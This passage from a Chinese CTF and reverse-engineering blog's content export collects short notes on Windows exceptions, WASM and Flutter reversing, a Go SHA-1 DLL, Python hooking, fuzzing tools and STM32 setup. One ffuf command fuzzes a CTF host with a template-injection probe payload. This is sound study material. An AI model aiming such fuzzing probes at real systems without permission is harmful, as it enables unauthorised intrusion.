)0xC015000FL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SXS_INVALID_DEACTIVATION  ((DWORD   )0xC0150010L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br></pre></td></tr></table></figure></div>

</blockquote>
<p>写对应的结构可以参考<a class="link"   href="https://github.com/XDSEC/miniLCTF_2021/blob/main/Challenges/Reverse/0ooooops/%E6%BA%90%E7%A0%81.cpp#L111" >miniLCTF_2021&#x2F;Challenges&#x2F;Reverse&#x2F;0ooooops&#x2F;源码.cpp at main · XDSEC&#x2F;miniLCTF_2021 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>GetExceptionInformation()</code>返回的<code>PEXCEPTION_POINTERS</code>链表存放着异常处的很多信息</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>windows</category>
        <category>pe</category>
      </categories>
  </entry>
  <entry>
    <title>pe1</title>
    <url>/2022/12/25/Re/windows/pe/pe1/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Re</category>
        <category>windows</category>
        <category>pe</category>
      </categories>
  </entry>
  <entry>
    <title>x86转x64</title>
    <url>/2024/03/20/Re/windows/pe/x86%E8%BD%ACx64/</url>
    <content><![CDATA[<p><a class="link"   href="https://blog.csdn.net/m0_50525151/article/details/129646740" >jmp指令【原理详解 8086汇编语言+笔记】-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>windows</category>
        <category>pe</category>
      </categories>
  </entry>
  <entry>
    <title>天堂之门</title>
    <url>/2024/07/30/Re/windows/pe/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/</url>
    <content><![CDATA[<p>在windows环境下，有win32和x64两种环境，用于区分它们的则是CS寄存器状态(起始时的CS是由pe文件的架构来定的)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407301347825.png"
                      alt="image-20240730134744662"
                ></p>
<p>exp题目 <a class="link"   href="https://www.cnblogs.com/lordtianqiyi/articles/16501516.html" >天堂之门 - TLSN - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>windows</category>
        <category>pe</category>
      </categories>
  </entry>
  <entry>
    <title>blutter</title>
    <url>/2024/07/23/Re/%E5%AE%89%E5%8D%93/flutter/blutter/</url>
    <content><![CDATA[<p><a class="link"   href="https://github.com/worawit/blutter" >worawit&#x2F;blutter: Flutter Mobile Application Reverse Engineering Tool (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>[<a class="link"   href="https://bbs.kanxue.com/thread-279403.htm" >原创]flutter逆向 ACTF native app-Android安全-看雪-安全社区|安全招聘|kanxue.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
        <category>flutter</category>
      </categories>
  </entry>
  <entry>
    <title>创建项目</title>
    <url>/2024/07/23/Re/%E5%AE%89%E5%8D%93/xposed/%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p><a class="link"   href="https://www.lbqaq.top/p/init-xposed/#%E7%BB%93%E8%AF%AD" >从零开始编写Xposed模块 (lbqaq.top) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
        <category>xposed</category>
      </categories>
  </entry>
  <entry>
    <title>gccException</title>
    <url>/2024/04/24/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/C&amp;C++/gccException/</url>
    <content><![CDATA[<p><a class="link"   href="https://solotzg.github.io/2023/09/04/system/cpp-exception/#C-Exception-Handling" >浅析 C++ 异常机制 | SOLOTZG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://4nsw3r.top/2022/02/03/SCTF-REVERSE-CplusExceptionEncrypt-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0" >https://4nsw3r.top/2022/02/03/SCTF-REVERSE-CplusExceptionEncrypt-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;exception&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> std::<span class="built_in">exception</span>();<span class="comment">//抛出异常,对象需要继承 exception 基类</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span>(<span class="type">const</span> std::exception&amp; e)</span><br><span class="line">    &#123; </span><br><span class="line">        std::cerr &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;<span class="comment">//异常处理语句</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>语言逆向</category>
        <category>C&amp;C++</category>
      </categories>
  </entry>
  <entry>
    <title>start</title>
    <url>/2024/05/12/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/WASM/start/</url>
    <content><![CDATA[<p>工具</p>
<blockquote>
<h2 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a>推荐工具</h2><p>jeb</p>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>apt安装下面两个即可</p>
<p><code>wabt</code>	<code>binaryen</code> </p>
<p>wasm-decompile 用于将wasm转为类js语言</p>
<p>wasm2wat 用于将wasm转为wat 前者是二进制文件 后者是文本</p>
</blockquote>
<h2 id="jeb操作"><a href="#jeb操作" class="headerlink" title="jeb操作"></a>jeb操作</h2><p>拖进jeb里选择wasmbc即可</p>
<blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202405120045490.png"
                      alt="image-20240512004506410"
                ></p>
</blockquote>
<p>函数入口一般会以start开头</p>
<blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202405120046015.png"
                      alt="image-20240512004629865"
                ></p>
</blockquote>
<p>之后就可以逆向啦</p>
<p>但是存在一个问题，它可能会将常量认为是指针(地址)，同时在更改对应定义时，他会decompile失败</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>语言逆向</category>
        <category>WASM</category>
      </categories>
  </entry>
  <entry>
    <title>Cgo_dll</title>
    <url>/2024/05/15/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/golang/Cgo_dll/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="Golang"><figure class="iseeu highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="keyword">type</span> SHA1Context <span class="keyword">struct</span> &#123;</span><br><span class="line">	M                       <span class="type">string</span></span><br><span class="line">	Message_Blocklist       [<span class="number">80</span>][<span class="number">4</span>]<span class="type">uint8</span></span><br><span class="line">	Message_bitBlocklist    [<span class="number">80</span>]<span class="type">string</span></span><br><span class="line">	Message_bitBlocklistALL <span class="type">string</span></span><br><span class="line">	index                   <span class="type">int</span></span><br><span class="line">	size                    <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha1PadMessage</span><span class="params">(context *SHA1Context)</span></span> &#123;</span><br><span class="line">	<span class="comment">//pading</span></span><br><span class="line">	context.size = <span class="built_in">len</span>(context.M) * <span class="number">8</span></span><br><span class="line">	<span class="keyword">for</span> _, j := <span class="keyword">range</span> context.M &#123;</span><br><span class="line">		context.Message_bitBlocklistALL += fmt.Sprintf(<span class="string">&quot;%08b&quot;</span>, j)</span><br><span class="line">	&#125;</span><br><span class="line">	padsize := (<span class="number">448</span> - context.size - <span class="number">1</span> + <span class="number">512</span>) % <span class="number">512</span></span><br><span class="line">	context.Message_bitBlocklistALL += <span class="string">&quot;1&quot;</span> + strings.Repeat(<span class="string">&quot;0&quot;</span>, padsize) + fmt.Sprintf(<span class="string">&quot;%064b&quot;</span>, context.size)</span><br><span class="line">	context.size = <span class="built_in">len</span>(context.Message_bitBlocklistALL)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; context.size; i += <span class="number">8</span> &#123;</span><br><span class="line">		tmp, _ := strconv.ParseInt(context.Message_bitBlocklistALL[i:i+<span class="number">8</span>], <span class="number">2</span>, <span class="number">9</span>)</span><br><span class="line">		context.Message_Blocklist[i/<span class="number">32</span>][i/<span class="number">8</span>%<span class="number">4</span>] = <span class="type">uint8</span>(tmp)</span><br><span class="line">		context.Message_bitBlocklist[i/<span class="number">32</span>] += context.Message_bitBlocklistALL[i : i+<span class="number">8</span>]</span><br><span class="line">		context.index = i/<span class="number">32</span> + <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">xor</span><span class="params">(a ...<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> <span class="built_in">len</span>(a) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		tmp := <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">for</span> i, j := <span class="keyword">range</span> a[<span class="number">0</span>] &#123;</span><br><span class="line">			<span class="keyword">if</span> <span class="type">string</span>(j) != <span class="type">string</span>(a[<span class="number">1</span>][i]) &#123;</span><br><span class="line">				tmp += <span class="string">&quot;1&quot;</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				tmp += <span class="string">&quot;0&quot;</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> tmp</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> xor(<span class="built_in">append</span>(a[<span class="number">2</span>:], xor(a[<span class="number">0</span>], a[<span class="number">1</span>]))...) <span class="comment">//...切片解包</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">and</span><span class="params">(a ...<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> <span class="built_in">len</span>(a) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		tmp := <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">for</span> i, j := <span class="keyword">range</span> a[<span class="number">0</span>] &#123;</span><br><span class="line">			<span class="keyword">if</span> <span class="type">string</span>(j) == <span class="string">&quot;1&quot;</span> &amp;&amp; <span class="type">string</span>(a[<span class="number">1</span>][i]) == <span class="string">&quot;1&quot;</span> &#123;</span><br><span class="line">				tmp += <span class="string">&quot;1&quot;</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				tmp += <span class="string">&quot;0&quot;</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> tmp</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> and(<span class="built_in">append</span>(a[<span class="number">2</span>:], and(a[<span class="number">0</span>], a[<span class="number">1</span>]))...) <span class="comment">//...切片解包</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">not</span><span class="params">(a <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	tmp := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> _, j := <span class="keyword">range</span> a &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="type">string</span>(j) == <span class="string">&quot;0&quot;</span> &#123;</span><br><span class="line">			tmp += <span class="string">&quot;1&quot;</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			tmp += <span class="string">&quot;0&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tmp</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a ...<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	tmp := <span class="type">int64</span>(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> _, j := <span class="keyword">range</span> a &#123;</span><br><span class="line">		tmq, _ := strconv.ParseInt(j, <span class="number">2</span>, <span class="number">33</span>)</span><br><span class="line">		tmp += tmq</span><br><span class="line">	&#125;</span><br><span class="line">	tmo := fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, tmp)</span><br><span class="line">	<span class="keyword">return</span> tmo[<span class="built_in">len</span>(tmo)<span class="number">-32</span>:]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">or</span><span class="params">(a ...<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> <span class="built_in">len</span>(a) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		tmp := <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">for</span> i, j := <span class="keyword">range</span> a[<span class="number">0</span>] &#123;</span><br><span class="line">			<span class="keyword">if</span> <span class="type">string</span>(j) == <span class="string">&quot;0&quot;</span> &amp;&amp; <span class="type">string</span>(a[<span class="number">1</span>][i]) == <span class="string">&quot;0&quot;</span> &#123;</span><br><span class="line">				tmp += <span class="string">&quot;0&quot;</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				tmp += <span class="string">&quot;1&quot;</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> tmp</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> or(<span class="built_in">append</span>(a[<span class="number">2</span>:], or(a[<span class="number">0</span>], a[<span class="number">1</span>]))...) <span class="comment">//...切片解包</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rotl</span><span class="params">(n <span class="type">int</span>, t ...<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="comment">//循环左移</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> <span class="built_in">len</span>(t) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> t[<span class="number">0</span>][n:<span class="number">32</span>] + t[<span class="number">0</span>][<span class="number">0</span>:n]</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">return</span> rotl(n, xor(t[<span class="number">0</span>], t[<span class="number">1</span>]))</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">return</span> rotl(n, xor(t[<span class="number">0</span>], t[<span class="number">1</span>]), t[<span class="number">2</span>])</span><br><span class="line">	<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">		<span class="keyword">return</span> rotl(n, xor(t[<span class="number">0</span>], t[<span class="number">1</span>]), xor(t[<span class="number">2</span>], t[<span class="number">3</span>]))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha1ProcessMessageBlock</span><span class="params">(context *SHA1Context)</span></span> &#123;</span><br><span class="line">	<span class="comment">//实现数据扩展</span></span><br><span class="line">	<span class="keyword">for</span> ; context.index &lt; <span class="number">80</span>; context.index++ &#123;</span><br><span class="line">		context.Message_bitBlocklist[context.index] = rotl(<span class="number">1</span>, context.Message_bitBlocklist[context.index<span class="number">-3</span>], context.Message_bitBlocklist[context.index<span class="number">-8</span>], context.Message_bitBlocklist[context.index<span class="number">-14</span>], context.Message_bitBlocklist[context.index<span class="number">-16</span>])</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span> &#123;</span><br><span class="line">			tmp, _ := strconv.ParseInt(context.Message_bitBlocklist[context.index][i:i+<span class="number">8</span>], <span class="number">2</span>, <span class="number">9</span>)</span><br><span class="line">			context.Message_Blocklist[context.index][i/<span class="number">8</span>] = <span class="type">uint8</span>(tmp)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makelist</span><span class="params">(context SHA1Context)</span></span> []SHA1Context &#123;</span><br><span class="line">	<span class="comment">//用于分组</span></span><br><span class="line">	<span class="keyword">var</span> contextlist []SHA1Context</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; context.size/<span class="number">512</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">var</span> tmpbyte [<span class="number">80</span>][<span class="number">4</span>]<span class="type">byte</span></span><br><span class="line">		<span class="keyword">var</span> tmpstr [<span class="number">80</span>]<span class="type">string</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">16</span>; j++ &#123;</span><br><span class="line">			tmpbyte[j] = context.Message_Blocklist[i*<span class="number">16</span>+j]</span><br><span class="line">			tmpstr[j] = context.Message_bitBlocklist[i*<span class="number">16</span>+j]</span><br><span class="line">		&#125;</span><br><span class="line">		tmp := SHA1Context&#123;</span><br><span class="line">			Message_Blocklist:    tmpbyte,</span><br><span class="line">			Message_bitBlocklist: tmpstr,</span><br><span class="line">			size:                 <span class="number">512</span>,</span><br><span class="line">			index:                <span class="number">16</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		contextlist = <span class="built_in">append</span>(contextlist, tmp)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> contextlist</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha1_digest</span><span class="params">(context *SHA1Context)</span></span> [<span class="number">20</span>]<span class="type">byte</span> &#123;</span><br><span class="line">	hash := []<span class="type">string</span>&#123;</span><br><span class="line">		fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0x67452301</span>),</span><br><span class="line">		fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0xEFCDAB89</span>),</span><br><span class="line">		fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0x98BADCFE</span>),</span><br><span class="line">		fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0x10325476</span>),</span><br><span class="line">		fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0xC3D2E1F0</span>)&#125;</span><br><span class="line">	a, b, c, d, e := hash[<span class="number">0</span>], hash[<span class="number">1</span>], hash[<span class="number">2</span>], hash[<span class="number">3</span>], hash[<span class="number">4</span>]</span><br><span class="line">	<span class="keyword">for</span> i, j := <span class="keyword">range</span> context.Message_Blocklist &#123;</span><br><span class="line">		w := fmt.Sprintf(<span class="string">&quot;%08b%08b%08b%08b&quot;</span>, j[<span class="number">0</span>], j[<span class="number">1</span>], j[<span class="number">2</span>], j[<span class="number">3</span>])</span><br><span class="line">		f := <span class="string">&quot;&quot;</span></span><br><span class="line">		k := <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">switch</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> i &lt; <span class="number">20</span>:</span><br><span class="line">			f = or(and(b, c), and(not(b), d)) <span class="comment">//&#x27;0b1100001011000100110001110000000&#x27;</span></span><br><span class="line">			<span class="comment">//&#x27;0b10001000100010001000100010001000&#x27;|&#x27;0b10000001100100101010001110110&#x27;</span></span><br><span class="line">			k = fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0x5A827999</span>)</span><br><span class="line">		<span class="keyword">case</span> i &lt; <span class="number">40</span>:</span><br><span class="line">			f = xor(b, c, d)</span><br><span class="line">			k = fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0x6ED9EBA1</span>)</span><br><span class="line">		<span class="keyword">case</span> i &lt; <span class="number">60</span>:</span><br><span class="line">			f = or(and(b, c), and(b, d), and(c, d))</span><br><span class="line">			k = fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0x8F1BBCDC</span>)</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			f = xor(b, c, d)</span><br><span class="line">			k = fmt.Sprintf(<span class="string">&quot;%032b&quot;</span>, <span class="number">0xCA62C1D6</span>)</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		tmp := add(rotl(<span class="number">5</span>, a), f, e, k, w)</span><br><span class="line">		e, d, c, b, a = d, c, rotl(<span class="number">30</span>, b), a, tmp</span><br><span class="line">	&#125;</span><br><span class="line">	hash[<span class="number">0</span>], hash[<span class="number">1</span>], hash[<span class="number">2</span>], hash[<span class="number">3</span>], hash[<span class="number">4</span>] = add(hash[<span class="number">0</span>], a), add(hash[<span class="number">1</span>], b), add(hash[<span class="number">2</span>], c), add(hash[<span class="number">3</span>], d), add(hash[<span class="number">4</span>], e)</span><br><span class="line">	hash_list2byte_list := <span class="function"><span class="keyword">func</span><span class="params">(a [5]<span class="type">string</span>)</span></span> [<span class="number">20</span>]<span class="type">byte</span> &#123;</span><br><span class="line">		tmp := [<span class="number">20</span>]<span class="type">byte</span>&#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> i := <span class="keyword">range</span> a &#123;</span><br><span class="line">			<span class="keyword">for</span> j := <span class="keyword">range</span> <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>) &#123;</span><br><span class="line">				tmq, _ := strconv.ParseUint(a[i][j*<span class="number">8</span>:j*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>, <span class="number">8</span>)</span><br><span class="line">				tmp[i*<span class="number">4</span>+j] = <span class="type">byte</span>(tmq)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> tmp</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hash_list2byte_list([<span class="number">5</span>]<span class="type">string</span>(hash))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//export Output</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Output</span><span class="params">(input *C.char)</span></span> *C.char &#123;</span><br><span class="line">	<span class="keyword">var</span> context SHA1Context</span><br><span class="line">	context.M = C.GoString(input)<span class="comment">//Cstring转GOstring</span></span><br><span class="line">	sha1PadMessage(&amp;context)</span><br><span class="line">	sha1ProcessMessageBlock(&amp;context)</span><br><span class="line">	tmp:=sha1_digest(&amp;context)</span><br><span class="line">	<span class="keyword">return</span> C.CString(fmt.Sprintln(tmp))<span class="comment">//生成对应字符串的的副本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Output(Output(C.CString(<span class="string">&quot;123456&quot;</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>语言逆向</category>
        <category>golang</category>
      </categories>
  </entry>
  <entry>
    <title>hook</title>
    <url>/2024/06/27/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/pyd/hook/</url>
    <content><![CDATA[<p><a class="link"   href="https://mp.weixin.qq.com/s/IwKxtqDd-5v0xhg9UzKe-g" >2024 RCTF writeup by Arr3stY0u (qq.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>dir和help可以查看导出的对象</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> check_secret</span><br><span class="line"><span class="built_in">help</span>(check_secret)</span><br><span class="line"><span class="comment">#可通过hook对应的返回值和参数，查看对应进行的操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook</span>(<span class="params">func,name</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_hook</span>(<span class="params">a,b</span>):</span><br><span class="line">        res=func(a,b)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;a:&gt;08x&#125;</span> <span class="subst">&#123;name&#125;</span> 0x<span class="subst">&#123;b:&gt;08x&#125;</span>=0x<span class="subst">&#123;res:&gt;08x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> func_hook</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> check_secret.<span class="built_in">map</span>.keys():</span><br><span class="line">    check_secret.<span class="built_in">map</span>[i]=hook(check_secret.<span class="built_in">map</span>[i],i)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>语言逆向</category>
        <category>pyd</category>
      </categories>
  </entry>
  <entry>
    <title>Gobuster</title>
    <url>/2024/07/25/Web/%E5%B7%A5%E5%85%B7/fuzz/Gobuster/</url>
    <content><![CDATA[<p>sudo apt install gobuster</p>
]]></content>
      <categories>
        <category>Web</category>
        <category>工具</category>
        <category>fuzz</category>
      </categories>
  </entry>
  <entry>
    <title>ffuf</title>
    <url>/2024/08/02/Web/%E5%B7%A5%E5%85%B7/fuzz/ffuf/</url>
    <content><![CDATA[<p><code>go install github.com/ffuf/ffuf@latest</code></p>
<p>过滤353大小的字符</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/rockyou.txt -u http://node5.anna.nssctf.cn:21990/?FUZZ=&#123;7*9&#125; -fs 353</span><br></pre></td></tr></table></figure></div>

<p>-fc</p>
<p>过滤对应的response code</p>
]]></content>
      <categories>
        <category>Web</category>
        <category>工具</category>
        <category>fuzz</category>
      </categories>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2024/04/30/Web/%E6%A1%86%E6%9E%B6/thinkphp/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Web</category>
        <category>框架</category>
        <category>thinkphp</category>
      </categories>
  </entry>
  <entry>
    <title>环境配置</title>
    <url>/2024/04/13/%E5%BC%80%E5%8F%91/IOT/Clion/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><blockquote>
<p>1.Clion</p>
<p>2.stm32cubemx</p>
</blockquote>
<p>安装好环境并配置好clion后</p>
<p>创建项目步骤</p>
<blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407161622512.png"
                      alt="image-20240716162226418"
                ></p>
<p>创建后选择</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407161623866.png"
                      alt="image-20240716162332835"
                ></p>
<p>默认是F03F4</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407161624857.png"
                      alt="image-20240716162414728"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407161624632.png"
                      alt="image-20240716162439530"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407161625569.png"
                      alt="image-20240716162514400"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407161626819.png"
                      alt="image-20240716162642708"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407161627365.png"
                      alt="image-20240716162705263"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407161627813.png"
                      alt="image-20240716162724709"
                ></p>
<p>最后回到clion即可</p>
</blockquote>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
